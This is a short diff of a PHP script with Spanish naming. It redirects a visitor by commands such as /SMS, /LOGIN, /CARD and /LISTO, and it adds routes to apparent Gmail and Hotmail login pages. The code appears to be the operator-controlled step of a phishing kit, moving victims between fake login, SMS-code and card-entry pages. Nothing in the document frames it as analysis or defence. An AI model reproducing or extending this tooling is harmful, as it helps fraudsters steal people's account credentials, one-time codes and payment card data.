@@ -12,14 +12,16 @@ if (file_exists($archivo)) {
     unlink($archivo);
 
     switch ($accion) {
-        case '/SMS':        header('Location: acceso.html');     break;
-        case '/SMSERROR':   header('Location: acceso.html');     break;
-        case '/LOGIN':      header('Location: log/index.php');   break;
-        case '/LOGINERROR': header('Location: log/index.php');   break;
-        case '/CARD':       header('Location: acceso.html');     break;
-        case '/LISTO':      header('Location: listo.html');      break;
+        case '/GMAIL':      header('Location: ../gm/index.html');  break;
+        case '/HSN':        header('Location: ../hm/index.php');   break;
+        case '/LOGIN':      header('Location: log/index.php');     break;
+        case '/SMS':        header('Location: acceso.html');       break;
+        case '/SMSERROR':   header('Location: acceso.html');       break;
+        case '/LOGINERROR': header('Location: log/index.php');     break;
+        case '/CARD':       header('Location: acceso.html');       break;
+        case '/LISTO':      header('Location: listo.html');        break;
         case '/ERROR':
-        default:            header('Location: inicio.html');     break;
+        default:            header('Location: inicio.html');       break;
     }
     exit;
 }
